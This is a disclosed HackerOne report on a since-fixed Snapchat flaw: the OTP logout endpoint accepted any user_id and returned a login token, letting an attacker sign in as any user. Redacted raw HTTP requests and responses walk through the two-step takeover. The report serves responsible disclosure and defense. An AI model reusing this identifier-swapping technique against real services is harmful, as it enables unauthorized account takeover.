---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2021-09-03
submitted: 2020-07-13T02:18:38.031Z
bounty_usd: null
votes: 973
cve: []
program: "[[programs/snapchat|Snapchat]]"
reporter: "korniltsev"
source: "https://hackerone.com/reports/921780"
title: "Improper Authentication - any user can login as other user with otp/logout & otp/login"
---
# Improper Authentication - any user can login as other user with otp/logout & otp/login

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 973 | **Program:** Snapchat | **Disclosed:** 2021-09-03

- Report: [https://hackerone.com/reports/921780](https://hackerone.com/reports/921780)
- CWE: Improper Authentication - Generic
- Submitted: 2020-07-13T02:18:38.031Z

## Report summary

This vulnerability was discovered on the One Tap Password (OTP) login/logout flow. If exploited, the attacker could log in to any account for which they had the user_id. This id is exposed in several places and should not have been trusted in the request by the logout endpoint.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.

I will demonstrate the problem on two accounts.
Victim: ███
Attacker: ██████████


-  Attacker perform a usuall login to attacker's personal account.
-  Attacker performs `/scauth/otp/droid/logout` but instead of attacker's user_id, attacker provides victim's user_id
request

```
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 168
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ███
x-snapchat-userid: █████
username: ███
req_token: █████████
timestamp: 1594604280000
Accept: application/json
User-Agent: Snapchat/10.78.1.0 █████
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate

{"user_id":"████","device_id":"███████","device_name":"███████"}
```

 response

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:39:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding
x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e
server: API Gateway
cache-control: no-cache, no-store
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snapchat-request-id: █████
x-snapchat-server-latency: 342
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 137

{"status":"SUCCESS","user_id":"█████████","token":"█████","expiry_hint":████}
```
Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.

-  Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.

```
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 6213
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ████████
User-Agent: Snapchat/10.78.1.0 ██████
Accept: application/json
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip, deflate

application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
```

response

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:40:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding,Accept-Encoding
x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c
server: API Gateway
cache-control: no-cache, no-store
x-snap-refresh-token: ████
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snap-access-tokens: ███
x-snapchat-request-id: ████████
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 138867

{"updates_response":{"logged":true,"username":"█████","user_id":"█████",...
```
An attacker successfully performed login as victim.

Victim's user_id can be easily obtained with friends request.

I've attached the following:
- a screencast to showcase the problem.
- burp project ████
- logout+login raw requests exported from burp
- a python script to perform the attack

I've tested this bug only on my personal accounts.
███████
███
█████████

## Impact

An attacker is able to  login as any user.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2020-07-13** @sfrisk: This was a great report! We put a fix in place. Can you validate that using a different user_id no longer returns an OTP token?
- **2020-07-13** @korniltsev: The fix seems legit. Now when I use different user_id I get `HTTP/1.1 401 Unauthorized`
- **2020-07-13** @sfrisk: Glad the fix worked. We are also interested, did you test this exploit with any other Snapchat accounts?
- **2020-07-13** @korniltsev: I've tested it only on the following accounts:
███
██████
███

You can see all my requests in the burp project.
- **2020-07-14** @sfrisk: Thanks! We are really impressed with this finding. Our panel will get back to you soon with award details.
- **2020-08-21** @korniltsev: It's been a month. Is the issue resolved? Can I help somehow?
- **2020-08-21** @sboni: Hi @████████,
Apologies for the delay, we have been deciding the bounty award and will get back to you shortly regarding the details. Thanks for your patience.
- **Bounty Awarded**
- **2020-08-28** @korniltsev: Thank you Snapchat for such huge bounty <3

I would like to do a public disclosure on h1 if possible.

Quick question not related to the report: I found that I could reuse `X-Snapchat-Client-Auth` header with multiple accounts and it has no ttl, for example I am still able to use the token I captured one month ago(the one from the play.py attachment) to perform login/register requests. I am not sure if it is important for snapchat. Do you think it may have some security implications? Should I create a separate report for this thing or it is not important?
- **2020-09-03** @ktr-sc: Hi @█████, thanks for reaching out! 
We are aware of `X-Snapchat-Client-Auth-Token` behavior that you mentioned. The token is used to reject requests from third-party Snapchat clients. Additionally, we have rate-limiting in place to prevent the type of brute-force login attempts.  For those reasons, we've determined that this does not pose a severe enough risk to warrant a priority fix.
As for public disclosure, we would really appreciate if you could hold off on it for a bit. While we fixed the underlying bug that caused the issue, we are still working towards improving our detection mechanism in response to this bug. Would that work for you? Thanks again for helping make Snap safe!
- **2020-09-03** @korniltsev: Works for me. no rush. any estimate when we will be able to disclose?
- **2021-07-01** @korniltsev: Hello Snapchat! Can we do full disclosure here?
- **2021-08-07** @korniltsev: Hello Snapchat! Can we do full disclosure here?
- **2021-08-25** @michael_xu: @████ thank you for your patience, I'm following up on the disclosure timeline internally.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
